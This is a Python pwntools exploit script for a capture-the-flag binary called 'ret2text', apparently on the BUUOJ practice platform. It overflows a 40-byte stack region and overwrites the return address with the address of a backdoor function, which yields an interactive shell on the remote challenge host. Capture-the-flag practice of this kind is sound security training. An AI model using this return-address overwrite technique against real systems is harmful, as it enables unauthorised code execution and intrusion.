'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "29412" 
filename = "ret2text"
elf = ELF(filename)
# libc = ELF("")
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

backdoor_addr = 0x00000000004011FB
buffer_overflow_size = 32 + 8
appending_string = cyclic(buffer_overflow_size)

def B():
    gdb.attach(io)
    pause()


def pwn():
    io.recv()
    payload = appending_string + p64(backdoor_addr)
    io.sendline(payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
